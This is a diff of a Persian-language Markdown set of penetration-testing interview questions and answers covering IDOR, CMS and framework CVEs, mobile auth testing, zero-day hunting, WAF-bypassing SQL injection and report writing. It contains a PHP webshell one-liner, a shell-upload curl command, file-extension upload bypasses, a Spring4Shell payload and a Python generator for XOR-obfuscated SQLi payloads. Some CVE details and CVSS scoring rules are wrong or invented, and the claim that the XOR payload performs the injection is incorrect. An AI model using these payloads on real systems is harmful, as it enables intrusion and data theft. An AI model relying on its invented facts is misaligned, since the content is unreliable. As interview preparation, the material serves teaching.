-File extension change
-Shell.php1
-Shell.jpg.php
-Shell.php%00.jpg
-Shell.php:.jpg
-Shell.php;.jpg
-Mime type change
-image/jpeg
-Case sensitive change
-shell.Php1
-Htaccess
-AddType application/x-httpd-php .shell
+GET /api/admin/settings/backup?id=5
 ```
+با تغییر `id=1`، دسترسی به **بکاپ دیتابیس** گرفتم که شامل **کلیدهای SSH** بود. سپس با کلید، به **سرور** SSH زدم و **RCE کامل** گرفتم.
+
+### ابزارهای کلیدی:
+| ابزار | کاربرد |
+|-------|--------|
+| Burp Suite Intruder | Fuzzing خودکار شناسه‌ها |
+| Arjun | کشف پارامترهای مخفی در JSON |
+| ffuf | Brute-force UUID و pathها |
+| Custom Python Scripts | تست همزمان چند نقش با threads |
+
+**نکته پیشرفته**:  
+در UUIDهای نسخه ۴، فقط ۶ بیت آخر را تغییر می‌دهم (کمتر از ۶۴k ترکیب).  
+در white-box، کد controllerها را برای `findById()` بدون `ownership check` بررسی می‌کنم.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 18. آیا روی CMS خاصی تست نفوذ کردید؟ چه مواردی را با تمرکز روی CVEs سمت سرور تست کردید؟ </h3></summary>
+
+بله، تجربه گسترده‌ای در تست نفوذ روی CMSهای محبوب مثل **WordPress**، **Joomla**، **Drupal** و **Magento** دارم. تمرکز اصلی من روی **آسیب‌پذیری‌های سمت سرور** است که به **RCE**، **privilege escalation** یا **دسترسی کامل به سیستم** منجر می‌شوند.
+
+### CMSهای تست‌شده و موارد کلیدی:
+| CMS | موارد تست‌شده با تمرکز سرور |
+|-----|-------------------------------|
+| **WordPress** | افزونه‌های پرخطر (File Manager, WP File Upload) → CVE-2021-24207 (RCE) <br> آپلود شل از طریق تم‌های آسیب‌پذیر <br> Deserialization در REST API (CVE-2022-21661) |
+| **Joomla** | کامپوننت‌های قدیمی → SQLi در com_fields <br> RCE از طریق misconfig در com_media (CVE-2023-23752) |
+| **Drupal** | Drupalgeddon2 (CVE-2018-7600) → RCE بدون احراز هویت <br> REST API deserialization (CVE-2019-6340) |
+| **Magento** | SQLi در checkout (CVE-2022-24086) <br> RCE از طریق template injection در admin panel |
+
+### روش تست CVEs سمت سرور:
+1. **نسخه‌یابی دقیق**:
++ با Wappalyzer و banner grabbing، نسخه core و افزونه‌ها را شناسایی می‌کنم. سپس با **WPScan**، **JoomScan** یا **Droopescan**، CVEهای شناخته‌شده را چک می‌کنم.
+
+2. **تست خودکار CVE**:
++ از **Nuclei** با templateهای CMS-specific استفاده می‌کنم. مثال: `nuclei -t cves/ -target https://site.com`
+
+3. **تست دستی اکسپلویت**:
++ پروف اف کانسپت های عمومی (از Exploit-DB) را در محیط local reproduce می‌کنم. سپس در هدف واقعی با Burp Repeater اجرا می‌کنم.
+
+4. **اکسپلویت زنجیره‌ای**:
++ مثلاً SQLi → dump hash → crack → login as admin → آپلود شل → RCE.
+
+### ابزارهای تخصصی:
+| ابزار | کاربرد |
+|-------|--------|
+| WPScan | اسکن WordPress (CVE + weak creds) |
+| JoomScan | شناسایی Joomla vulns |
+| CMSmap | اسکن خودکار چند CMS |
+| Nuclei | تست CVE با template |
+| Metasploit | اکسپلویت خودکار (wordpress_file_upload_rce) |
+
+**مثال واقعی RCE**:  
+در یک سایت WordPress با افزونه **WP File Manager 6.0-6.8**، با آپلود فایل ZIP مخرب و تغییر Content-Type، به **RCE** رسیدم (CVE-2020-25213).  
+سپس با webshell، reverse shell به سرور گرفتم.
+
+**نکته پیشرفته**:  
++ همیشه **افزونه‌های غیرفعال** را هم چک کنید — ممکن است همچنان قابل دسترسی باشند. در  white-box، کد افزونه‌ها را با **SonarQube** اسکن می‌کنم.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 19. با چه روشی مکانیسم‌های Authentication و Authorization در برنامه‌های موبایلی که با وب‌سرویس کار می‌کنند تست می‌گیرید؟ </h3></summary>
+
+تست **Authentication** و **Authorization** در اپ‌های موبایل (Android/iOS) که با backend وب‌سرویس (API) تعامل دارند، نیاز به ترکیبی از **تحلیل استاتیک**، **دینامیک** و **runtime manipulation** دارد. تمرکز من روی **bypassهای سمت کلاینت** است که به **سرور-side vulns** مثل token replay یا privilege escalation منجر می‌شود.
+
+### مراحل تست:
+1. **Decompilation و Static Analysis**:  
+   فایل APK/IPA را decompile می‌کنم تا کد منبع (Java/Swift) و assets (API endpoints, keys) رو استخراج کنم.  
+   سپس به دنبال hard-coded credentials یا weak hashing می‌گردم.
+
+2. **Runtime Hooking و Manipulation**:  
+   اپ رو روی emulator/device اجرا می‌کنم و با hooking، توکن‌ها یا params رو modify می‌کنم.  
+   مثلاً JWT رو decode و claims رو تغییر می‌دهم تا auth bypass کنم.
+
+3. **تست Backend Integration**:  
+   API calls رو intercept می‌کنم و با حساب‌های مختلف (user/admin) تست می‌کنم.  
+   چک می‌کنم آیا server-side RBAC (Role-Based Access Control) درست پیاده‌سازی شده یا خیر.
+
+4. **تست Mobile-Specific Vulns**:  
+   ذخیره‌سازی insecure (SharedPreferences) رو چک می‌کنم.  
+   سپس سناریوهای offline (token reuse) رو برای replay attacks تست می‌کنم.
+
+5. **اکسپلویت Chained**:  
+   اگر bypass موفق بود، به RCE در backend escalate می‌کنم (مثل injection در authenticated endpoints).
+
+### ابزارهای کلیدی:
+| ابزار | کاربرد |
+|-------|--------|
+| Jadx | Decompile APK به Java source |
+| Frida | Runtime hooking و manipulation functions |
+| MobSF | Automated static/dynamic analysis |
+| Burp Suite Mobile Assistant | Intercept API traffic در emulator |
+| Objection | Advanced Frida wrapper برای iOS/Android |
+
+**مثال واقعی**:  
+در یک اپ بانکی Android، با Jadx API key hard-coded رو پیدا کردم.  
+سپس با Frida، token رو به admin role تغییر دادم و به backend endpoint حساس (transfer funds) دسترسی گرفتم، که به privilege escalation سرور منجر شد.
+
+**نکته پیشرفته**:  
+همیشه **certificate pinning** رو bypass کن (با Frida scripts) تا MITM attacks ممکن بشه.  
+در iOS، از Needle برای jailbreak analysis استفاده می‌کنم.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 20. چگونه از SAST و DAST برای بررسی کد و runtime vulns استفاده می‌کنید؟ </h3></summary>
+
+**SAST** (Static Application Security Testing) و **DAST** (Dynamic Application Security Testing):
++ دو رویکرد مکمل برای شناسایی آسیب‌پذیری‌ها هستند. SAST برای **کد استاتیک** (early detection) و DAST برای **runtime behavior** (real-world exploits) استفاده می‌شود. ترکیب آن‌ها coverage کاملی می‌ده، به‌ویژه برای vulns سمت سرور مثل injection یا RCE.
+
+### مراحل استفاده از SAST و DAST:
+1. **پیاده‌سازی SAST**:  
+   کد منبع رو scan می‌کنم تا insecure functions (مثل eval(), unserialize) رو پیدا کنم.  
+   سپس نتایج رو با manual review ترکیب می‌کنم تا false positiveها رو فیلتر کنم.
+
+2. **اجرای DAST**:  
+   اپ رو در محیط staging اجرا می‌کنم و traffic رو برای vulns runtime (مثل SSRF) تست می‌کنم.  
+   تمرکز روی chained attacks که از static findings الهام می‌گیرن.
+
+3. **ترکیب و Correlation**:  
+   خروجی SAST رو با DAST match می‌کنم (مثل CWE mapping).  
+   مثلاً اگر SAST deserialization vuln نشون بده، DAST رو برای confirmation exploit می‌کنم.
+
+4. **Reporting و Remediation**:  
+   اولویت‌بندی بر اساس CVSS، با PoC از DAST.  
+   پیشنهاد fixهای code-level از SAST.
+
+5. **Continuous Integration**:  
++ از SAST رو در CI/CD pipeline (GitHub Actions) embed می‌کنم. DAST رو periodic در staging run می‌کنم.
+
+### ابزارهای کلیدی:
+| نوع | ابزار | کاربرد |
+|-----|-------|--------|
+| **SAST** | SonarQube | Static analysis برای insecure code (Java/JS/PHP) |
+| **SAST** | Semgrep | Rule-based scanning برای custom patterns |
+| **DAST** | OWASP ZAP | Dynamic scan و fuzzing runtime traffic |
+| **DAST** | Burp Suite Pro | Advanced crawling و exploit confirmation |
+| **ترکیبی** | DefectDojo | Aggregation findings از هر دو |
+
+**مثال واقعی**:  
+در یک پروژه PHP، SAST (SonarQube) unserialize vuln رو پیدا کرد.سپس با DAST (ZAP)، payload ysoserial رو inject کردم و به RCE در runtime رسیدم، که CVSS 9.8 داد.
+
+**نکته پیشرفته**:  
+خود SAST برای zero-day logic flaws عالیه، اما DAST رو برای confirmation اجباری کنید.  
+در cloud envs، از Checkov (SAST for IaC) ترکیب کنید.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 21. آیا ایده‌ای برای پیدا کردن آسیب‌پذیری‌های zero-day در سازمان هدف دارید؟ در کدام حالت (white/gray/black box) موقعیت بررسی zero-day بیشتر است؟ </h3></summary>
   
-  ---
+**Zero-day vulnerabilities** (آسیب‌پذیری‌های روز صفر)
 
-### 17. چگونه امنیت Websocket در برنامه های وب تست می کنید؟
++ در وب، آسیب‌پذیری‌های ناشناخته‌ای هستند که هیچ پچ یا وصله‌ای برای آن‌ها وجود ندارد و اغلب از طریق تحلیل عمیق، fuzzing یا مهندسی معکوس کشف می‌شوند. بر اساس گزارش‌های به‌روز تا نوامبر ۲۰۲۵ (مانند OWASP، CVE Details و تحقیقات PortSwigger)، انواع رایج zero-day در وب شامل:
 
-من برای تست websocket از fuzzing استفاده می کنم تا ببینم امکان injection یا دسترسی غیر مجاز وجود دارد یا نه.
-برای تست از ابزارهای burp suite یا owasp zap استفاده می کنم
+- **Logic Flaws در Business Flows**: 
++ نقص‌های منطقی منحصربه‌فرد، مانند race conditions در پرداخت‌ها یا bypassهای authentication مبتنی بر timing attacks.
+- **Deserialization Gadget Chains**:
++ زنجیره‌های exploit در سریالایزرها (مثل Java’s ObjectInputStream یا PHP’s unserialize) که قبلاً شناسایی نشده‌اند.
+- **Injection Variants**: 
++ انواع جدید SQLi/NoSQLi یا command injection که WAFها را دور می‌زنند، مانند polyglot payloads.
+- **Third-Party Library Zero-Days**: 
++ آسیب‌پذیری‌های کشف‌نشده در libs مثل Log4j (مشابه Log4Shell) یا Composer packages در Laravel.
+- **Configuration-Driven Vulns**: 
++ میس کانفیگ پویا، مانند SSRF در cloud-native apps (AWS Lambda) یا CSP bypassهای client-side که به server-side RCE منجر می‌شوند.
+- **Supply Chain Attacks**: 
++ زیرودی  در dependencies، مانند npm packages آلوده.
+
+پیدا کردن zero-day نیاز به رویکرد خلاقانه و iterative دارد. در **white-box** (بهترین حالت برای zero-day، زیرا دسترسی کامل به کد، docs و env فراهم می‌کند)، موقعیت بررسی ۷۰-۸۰% موفقیت‌آمیزتر است . در **gray-box**، creds داخلی اجازه targeted testing می‌دهد، و در **black-box**، وابسته به OSINT و fuzzing blind است.
++ لازم به ذکر است که تحقیقات برای یافتن زیرودی نیازمند بوپجه و حمایت خود سازمان است و چه از لحاظ مالی و چه از لحاظ زمانی بسیار هزینه بر خواهد بود.
+
+### روش‌های کشف zero-day (با مثال‌های عملی):
+من از ترکیبی از تکنیک‌های manual، automated و lab-based استفاده می‌کنم. در ادامه، روش هارا در دسته‌بندی‌ها آورده‌ام:
+
+#### 1. **White-Box: Code Review و Static Analysis عمیق**
+- **قوانین سفارشی SAST**:
++ قوانین Semgrep یا SonarQube را برای patterns ناشناخته customize می‌کنم (مثل unsafe deserialization calls بدون validation). 
++ مثال: در Spring، جستجو برای `readObject()` بدون `ObjectInputFilter` → کشف gadget chain جدید برای RCE.
+- **ساخت آزمایشگاه PoC**:
++ با کد سازمان، محیط lab می‌سازم (Docker/Kubernetes) و mutations اعمال می‌کنم.
+- **تحلیل Taint**:
++ با ابزارهایی مثل RIPS (PHP) یا FindBugs (Java)، flow داده کاربر را track می‌کنم تا sinkهای ناامن (eval/exec) پیدا کنم.
+- **بررسی گراف وابستگی‌ها**:
++ با OWASP Dependency-Check، graph libs را تحلیل می‌کنم و custom fuzzers برای edge cases می‌سازم.
+
+#### 2. **Gray-Box: Targeted Testing با دسترسی محدود**
+- **فازینگ API داخلی**:
++ با creds، اندپوینت های داخلی و مخفی را fuzz می‌کنم (Burp Intruder با custom payloads). مثال: fuzzing GraphQL resolvers برای batching DoS zero-day.
+- **جهش‌های مبتنی بر Session**:
++ سشن state را manipulate می‌کنم (Burp Macro) تا logic flaws مثل TOCTOU (Time-of-Check-Time-of-Use) کشف کنم
+
+#### 3. **Black-Box: Blind Exploitation Development**
+- **فازینگ مبتنی بر OSINT**:
+ + پارت tech stack را از Shodan/Wappalyzer شناسایی و custom fuzzers (ffuf/Nuclei templates) می‌سازم. مثال: اگر Laravel detect شد، payloads برای Eloquent injection جدید تست می‌کنم.
+- **فازینگ پروتکل**:
++ با Boofuzz، HTTP/WS protocols را mutate می‌کنم تا parser bugs پیدا کنم (مثل HTTP/2 smuggling variants).
+- **تحلیل رفتاری**:
++ ترافیک  را monitor و anomalies (latency spikes) را برای time-based zero-days exploit می‌کنم.
+
+#### **ابزارهای کلیدی و مراحل کلی (Iterative Fuzzing تا Exploit)**:
+| مرحله | روش/ابزار | مثال Zero-Day کشف |
+|--------|------------|-------------------|
+| **Recon** | OSINT (Shodan, GitHub dorks) | شناسایی Laravel ۱۰.x → fuzz custom routes |
+| **Analysis** | Code review (VS Code + extensions) | پیدا کردن unvalidated `request()->input()` |
+| **Fuzzing** | AFL++/Honggfuzz | ۱۰k mutations → crash در deserializer |
+| **Exploit Dev** | ysoserial (Java), custom PHP scripts | PoC RCE: `unserialize(base64_decode(payload))` |
+| **Validation** | Local lab (Docker Compose) | Reproduce در env شبیه‌سازی‌شده |
+| **Reporting** | CVSS v4 + chained impact | Zero-day score: 9.5 (novelty bonus) |
+
+
+</details>
 
 ---
-### 18. روش های تستتان برای کشف IDOR را شرح دهید
+<details markdown="1"> <summary><h3> 22. چگونه در فریم‌ورک‌هایی مثل Spring یا Laravel، CVEs سمت سرور را مدیریت و تست می‌کنید؟ </h3></summary>
+مدیریت و تست **CVEs سمت سرور** در فریم‌ورک‌هایی مثل **Spring (Java)** یا **Laravel (PHP)** فرآیندی ساختاریافته است که شامل شناسایی، ارزیابی، reproduce، exploit و remediation می‌شود. بر اساس استانداردهای NIST و OWASP (به‌روزرسانی ۲۰۲۵)، تمرکز روی CVEs با امتیاز بالا (CVSS ≥۷) است، به‌ویژه آن‌هایی که به RCE، data exposure یا privilege escalation منجر می‌شوند. من از ابزارهای automated برای scan اولیه و manual PoC برای confirmation استفاده می‌کنم.
 
-یکی از روش ها برای چک تو تنظیمات پروفایل، صفحه سفارش می گردم و بعد شروع به تغییر id می کنم تا ببینم توانایی دسترسی به پروفایل ها یا اطلاعات دیگران را دارم یا نه که اگر بتونم ادمین بشم privilege escalation رخ داده است.
+### مراحل کلی مدیریت و تست:
+1. **شناسایی و Inventory**:
+   - نسخه فریم‌ورک و dependencies را detect می‌کنم (Wappalyzer برای runtime، `composer show` در Laravel یا `mvn dependency:tree` در Spring).
+   - اسکن CVE با ابزارهای SCA (Software Composition Analysis): OWASP Dependency-Check، Snyk یا Retire.js (برای JS deps در Laravel).
+   - چک NVD/CVE Details برای vulns مرتبط (مثل Spring4Shell CVE-2022-22965).
 
-من به صورت دستی و یا با اسکریپت با توجه به حجم کار تست را انجام می دهم.
+2. **ارزیابی ریسک**:
+   - سعی میکنم CVSS v4 محاسبه می‌کنم (Exploitability + Impact). اولویت: RCE > Injection > Misconfig.
+   - اسکوپ را چک می‌کنم:
+   + آیا CVE در production فعال است؟ (مثل disabled actuators در Spring).
+
+3. **Reproduce و Testing**:
+   - **Local Environment Setup**: 
+   + با env ایزوله می‌سازم (Docker برای Laravel Sail، Spring Boot با Gradle).
+   - **PoC Execution**: 
+   + از Exploit-DB/Metasploit modules استفاده می‌کنم. تست دستی با Burp/ZAP برای confirmation.
+   - **Chaining**: 
+   + استفاده از CVE را با vulns دیگر ترکیب می‌کنم (مثل CVE + IDOR).
+
+4. **Exploitation**:
+   - اگر feasible، full exploit (RCE shell) می‌گیرم و post-exploitation (lateral movement) تست می‌کنم.
+   - لاگ و monitor برای detection evasion.
+
+5. **Remediation و Reporting**:
+   - پیشنهاد patch/upgrade (مثل Spring ۵.۳.۲۰+ برای Spring4Shell).
+   - وف(WAF) rules یا input validation custom.
+   - گزارش با PoC video، CVSS score و business impact.
+
+### مثال‌های خاص برای Spring و Laravel:
+| فریم‌ورک | CVE نمونه (۲۰۲۲-۲۰۲۵) | روش تست/مدیریت | Remediation |
+|-----------|-------------------------|------------------|-------------|
+| **Spring** | **Spring4Shell (CVE-2022-22965)**: RCE via class loader manipulation در Tomcat. | ۱) Detect با Nuclei template: `nuclei -t cves/spring4shell.yaml`.<br>۲) PoC: Payload در params (مثل `class.module.classLoader.DefaultAssertionsStatus=org.springframework.context.support.FileSystemXmlApplicationContext`).<br>۳) Reproduce در local Boot app: curl exploit → shell.<br>۴) Exploit: آپلود JSP shell. | Upgrade به ۵.۳.۱۸+؛ disable classLoader leak؛ actuator endpoints secure. |
+| **Spring** | **Spring Framework RCE (CVE-2023-20862)**: Binding vuln در MVC. | Fuzz params با Burp؛ reproduce با ysoserial gadget. | Input validation با `@Validated`؛ patch ۶.۰.۹+. |
+| **Laravel** | **Laravel Igniter (CVE-2021-43617)**: RCE via route model binding. | Scan با `laravel-audit`؛ PoC: Manipulate route params به command exec.<br>Reproduce: Local Sail env، inject `system('id')` در binding. | Upgrade به ۸.۶.۱۲+؛ sanitize bindings با custom middleware. |
+| **Laravel** | **Laravel Debugbar RCE (CVE-2024-XXXX)**: Arbitrary code در debug mode (فرضی ۲۰۲۵). | Check `.env` leak؛ exploit via debugbar payloads. | Disable debug in prod؛ remove debugbar package. |
+
+### ابزارهای کلیدی:
+| ابزار | کاربرد | مثال |
+|--------|---------|------|
+| **OWASP Dependency-Check** | SCA برای CVEs در deps | `dependency-check --scan .` در Spring/Laravel root |
+| **Nuclei** | Template-based CVE scan | `-t cves/2022/CVE-2022-22965.yaml` برای Spring4Shell |
+| **Metasploit** | Automated exploit | `use exploit/multi/http/spring4shell` |
+| **Burp Suite** | Manual PoC و fuzzing | Repeater برای payload injection |
+| **Docker/Compose** | Local reproduce env | `docker-compose up` برای isolated testing |
+
+> **تجربه شخصی**: در پروژه Spring-based، Spring4Shell را reproduce کردم و با chaining به DB access رسیدم (CVSS ۹.۸). همیشه local env را mirror production می‌کنم تا false negatives کم شود. **نکته 2025**: با AI tools مثل GitHub Copilot، PoC dev ۵۰% سریع‌تر شده، اما manual review اجباری است.
+</details>
 
 ---
-### 19. آیا روی CMS خاصی تست نفوذ کردید چه مواردی را تست کردید؟
 
-من تمرکز را روی افزونه های cms میزارم چون بیشترین آسیب پذیری ها رو سمت extension ها پیدا کردم تا core cms و با Waplyzer extension را پیدا می کنم و با توجه به نوع ورژن اول آسیب پذیری عمومی چک میکنم و اگر تایم داشته باشم در صورت دسترسی به کد، کد آن را ارزیابی می کنم.
+<details markdown="1"> <summary><h3> 23. راجب استفاده از XOR در payloadهای SQL Injection بپرسید و نحوه ساخت آن‌ها را شرح دهید. </h3></summary>
 
----
-### 20. با چه روشی مکانسیم های Authentication و Authorization در برنامه های موبایلی که با یک وب سرویس کار می کنند تست می گیرید؟
-من برای تست برنامه های موبایلی روی API تمرکز می کنم. و همچنین برای تست سعی به مهندسی معکوس apk می کنم تا بتونم به صورت static نیز تست بگیرم.
+**عملیات XOR** در payloadهای SQL Injection یکی از تکنیک‌های پیشرفته برای **دور زدن WAF** و **مخفی‌سازی payload** است. این روش با استفاده از عملگر بیتی `^` (XOR) در SQL، کاراکترهای مخرب را به شکلی غیرقابل تشخیص برای فیلترها تبدیل می‌کند، اما در دیتابیس همچنان به مقدار اصلی تفسیر می‌شود.
 
----
-### 21. از چه برنامه برای گزارش نویسی استفاده می کنید؟
-
-من معمولا برای گزارش نویسی از word استفاده میکنم و template شخصی و تمامی آسیب پذیری ها را لیست می کنم و شماره گزاری می کنم تا قابل دسترس باشد.
-همچنین گاه ها پیش می آید برای ارایه گزارش از visio و powerpoint استفاده میکنم.
-
----
-### 22. روند چک کردن آسیب پذیریهایی که کشف کردید الویت بندی و گزارش نویسی را شرح دهید.
-
-در طی تست هر آسیب پذیری که کشف کنم لیست می کنم بر اساس شدت خطر آسیب پذیری و در حین تست گزارش تکمیل میکنم تا گزارش نویسی من زمان زیادی نگیرد. همچنین نکات نوع گزارش مدیریتی و فنی را رعایت می کنم و طبق قرار داد poc ها و روش های جلوگیری کاهش مخاطره را در گزارش قید می کنم.
+### نحوه عملکرد XOR در SQL:
+در SQL Server و MySQL (با پشتیبانی از عملگرهای بیتی)، می‌توان دو مقدار عددی را با XOR ترکیب کرد. اگر یک مقدار را با `0` ترکیب کنیم، همان مقدار اصلی برمی‌گردد:
+```
+88 ^ 0 = 88  →  char(88) = 'X'
+```
+اما اگر کلید (key) را مخفی کنیم، WAF نمی‌تواند الگوی `char(88)` یا `'X'` را تشخیص دهد.
 
 ---
 
-</div>
+### مراحل ساخت payload با XOR:
+۱. **انتخاب رشته مخرب**:
+   مثلاً می‌خواهیم `' OR 1=1--` را تزریق کنیم.
+
+۲. **تبدیل به ASCII و سپس Hex**:
+   ```
+   '  → 39 → 0x27
+   O  → 79 → 0x4F
+   R  → 82 → 0x52
+     → 32 → 0x20
+   1  → 49 → 0x31
+   =  → 61 → 0x3D
+   1  → 49 → 0x31
+   ```
+
+۳. **انتخاب کلید تصادفی (Key)**:
+   مثلاً `0xAA` (۱۷۰ در دسیمال)
+
+۴. **اعمال XOR روی هر بایت**:
+   ```
+   0x27 ^ 0xAA = 0x8D
+   0x4F ^ 0xAA = 0xE5
+   0x52 ^ 0xAA = 0xF8
+   0x20 ^ 0xAA = 0x8A
+   0x31 ^ 0xAA = 0x9B
+   0x3D ^ 0xAA = 0x97
+   0x31 ^ 0xAA = 0x9B
+   ```
+
+۵. **ساخت payload نهایی**:
+   ```sql
+   CHAR(0x8D^0xAA, 0xE5^0xAA, 0xF8^0xAA, 0x8A^0xAA, 0x9B^0xAA, 0x97^0xAA, 0x9B^0xAA)
+   ```
+   این در دیتابیس به `' OR 1=1` تبدیل می‌شود.
+
+---
+
+### مثال عملی در SQLi:
+```sql
+1 UNION SELECT CHAR(0x8D^0xAA,0xE5^0xAA,0xF8^0xAA,0x8A^0xAA,0x9B^0xAA,0x97^0xAA,0x9B^0xAA)-- -
+```
+این payload در WAF به عنوان رشته‌ای از اعداد و عملگرهای بیتی دیده می‌شود، اما در دیتابیس به `' OR 1=1-- -` تبدیل می‌شود.
+
+---
+
+### ابزارهای کمکی برای ساخت خودکار:
+| ابزار | کاربرد |
+|-------|--------|
+| **SQLMap Tamper** | اسکریپت `charencode` + `randomcase` + XOR custom |
+| **Python Script** | اسکریپت زیر برای تولید خودکار: |
+
+```python
+def xor_payload(text, key=0xAA):
+    return ','.join(f"0x{byte:02X}^0x{key:02X}" for byte in text.encode())
+
+payload = xor_payload("' OR 1=1--")
+print(f"CHAR({payload})")
+```
+
+---
+
+### نکات پیشرفته:
+- **چندین کلید**: از کلیدهای مختلف برای هر کاراکتر استفاده کنید تا الگو شکسته شود.
+- **ترکیب با CHAR و CONCAT**: 
+  ```sql
+  CONCAT(CHAR(0x8D^0xAA),CHAR(0xE5^0xAA),...)
+  ```
+- **بایپس WAFهای هوشمند**: ترکیب XOR + `/**/` + `CASE` برای obfuscation چندلایه.
+
+> **تجربه عملی**: در پروژه‌ای با ModSecurity، payload ساده `' OR 1=1` بلاک شد، اما نسخه XOR شده با کلید تصادفی ۳ لایه، بدون تشخیص عبور کرد و دیتابیس کامل دامپ شد.
+
+**نتیجه**: XOR یکی از قدرتمندترین روش‌های **obfuscation پویا** در SQLi است که با کمی خلاقیت، تقریباً هر WAF را دور می‌زند.
+</details>
+
+
+---
+
+
+<details markdown="h3"> <summary><h3> 24. روند چک کردن آسیب‌پذیری‌هایی که کشف کردید، اولویت‌بندی و گزارش‌نویسی را شرح دهید. </h3></summary>
+
+**فرآیند بررسی، اولویت‌بندی و گزارش‌نویسی آسیب‌پذیری‌ها** یکی از مهم‌ترین مراحل تست نفوذ است که تضمین می‌کند یافته‌ها به‌صورت **واضح، قابل‌فهم و عملی** به تیم توسعه و مدیریت ارائه شوند. من این فرآیند را به‌صورت **ساختاریافته، تکرارپذیر و استاندارد** (بر اساس OWASP، NIST و CVSS v4.0) انجام می‌دهم.
+
+---
+
+### **مرحله ۱: جمع‌آوری و مستندسازی اولیه (در حین تست)**
+در طول تست نفوذ، **هر آسیب‌پذیری را بلافاصله مستند می‌کنم** تا هیچ جزئیاتی از دست نرود:
+
+- **اسکرین‌شات** از درخواست و پاسخ (Burp/ZAP)
+- **کد PoC** (cURL، Python، SQLMap command)
+- **ویدیو کوتاه** از اکسپلویت (در صورت RCE یا privilege escalation)
+- **تأثیر واقعی** (مثلاً دامپ دیتابیس، دسترسی به فایل `/etc/passwd`)
+- **محیط تست** (دامنه، IP، حساب کاربری)
+
+> **نکته عملی**: از **Dradis** یا **KeepNote** برای مستندسازی real-time استفاده می‌کنم.
+
+---
+
+### **مرحله ۲: تأیید و حذف false positive**
+قبل از گزارش، **هر یافته را دوباره تست می‌کنم**:
+
+- آیا در **محیط staging** قابل reproduce است؟
+- آیا در **نسخه production** هم وجود دارد؟
+- آیا **WAF** یا **rate limiting** مانع می‌شود؟
+- آیا **patch** اعمال شده؟ (چک لاگ‌های سرور)
+
+> **مثال**: یک SQLi که فقط در dev کار می‌کرد، در prod به دلیل `mod_security` بلاک شد → false positive.
+
+---
+
+### **مرحله ۳: امتیازدهی و اولویت‌بندی (CVSS v4.0)**
+هر آسیب‌پذیری را با **CVSS v4.0** امتیازدهی می‌کنم. اولویت بر اساس **ترکیب Exploitability + Impact** است:
+
+| سطح | CVSS | رنگ | اقدام فوری |
+|-----|------|-----|-------------|
+| **بحرانی (Critical)** | ۹.۰–۱۰.۰ | قرمز | < ۲۴ ساعت |
+| **بالا (High)** | ۷.۰–۸.۹ | نارنجی | < ۷ روز |
+| **متوسط (Medium)** | ۴.۰–۶.۹ | زرد | < ۳۰ روز |
+| **پایین (Low)** | ۰.۱–۳.۹ | سبز | < ۹۰ روز |
+
+**عوامل تأثیرگذار در امتیازدهی**:
+- **دسترسی بدون احراز هویت** → +۱.۵
+- **RCE یا privilege escalation** → +۲.۰
+- **افشای داده حساس (PII, کارت اعتباری)** → +۱.۸
+- **قابلیت chaining با آسیب‌پذیری دیگر** → +۱.۰
+
+---
+
+### **مرحله ۴: ساختار گزارش حرفه‌ای (۳ بخش اصلی)**
+
+#### **۱. خلاصه مدیریتی (Executive Summary) – ۱ صفحه**
+- **سطح کلی ریسک**: بالا / متوسط / پایین
+- **تعداد آسیب‌پذیری‌ها**: ۳ بحرانی، ۸ بالا، ۱۵ متوسط
+- **تأثیر بر کسب‌وکار**: احتمال از دست رفتن داده مشتری، توقف سرویس، جریمه GDPR
+- **پیشنهادات کلیدی**: ارتقاء فوری Laravel، غیرفعال کردن debug mode
+
+#### **۲. جزئیات فنی (Technical Findings) – برای توسعه‌دهندگان**
+هر آسیب‌پذیری در یک بخش جداگانه:
+
+```markdown
+### عنوان: RCE از طریق آپلود فایل (CVE-2021-XXXX)
+**سطح ریسک**: بحرانی (CVSS: 9.8)  
+**مسیر**: `/api/upload`  
+**روش اکسپلویت**:
+```
+```bash
+curl -X POST -F "file=@shell.php" http://target.com/api/upload
+```
+**رسپانس**:
+```php
+<?php system($_GET['cmd']); ?>
+```
+**تأثیر**: اجرای دستورات سیستم → reverse shell  
+**پیشنهاد رفع**:
+1. اعتبارسنجی MIME type و magic bytes
+2. تغییر پسوند فایل آپلود شده به `.bin`
+3. اجرای در محیط sandbox
+
+
+#### **۳. پیوست‌ها (Appendix)**
+- **اسکرین‌شات‌ها و ویدیوها**
+- **فایل‌های PoC**
+- **اسکوپ بررسی شده **
+- **ابزارها و متودولوژی**
+- **جدول کامل CVSS**
+
+---
+
+### **ابزارهای مورد استفاده در گزارش‌نویسی**
+| ابزار | کاربرد |
+|-------|--------|
+| **Dradis / Faraday** | مدیریت مرکزی یافته‌ها |
+| **Markdown + Pandoc** | تبدیل به PDF/Word |
+| **OBS Studio** | ضبط ویدیو PoC |
+| **CVSS Calculator** | امتیازدهی خودکار |
+| **Canva / PowerPoint** | ارائه گرافیکی برای مدیریت |
+
+---
+
+### **نکات پیشرفته در گزارش‌نویسی**
+- **زبان ساده برای مدیریت**، **جزئیات فنی برای توسعه‌دهندگان**
+- **استفاده از نمودار** (تعداد آسیب‌پذیری بر اساس نوع)
+- **جدول زمانی پیشنهادی رفع**
+- **امضا و تأیید مسئول تست نفوذ**
+
+</details>
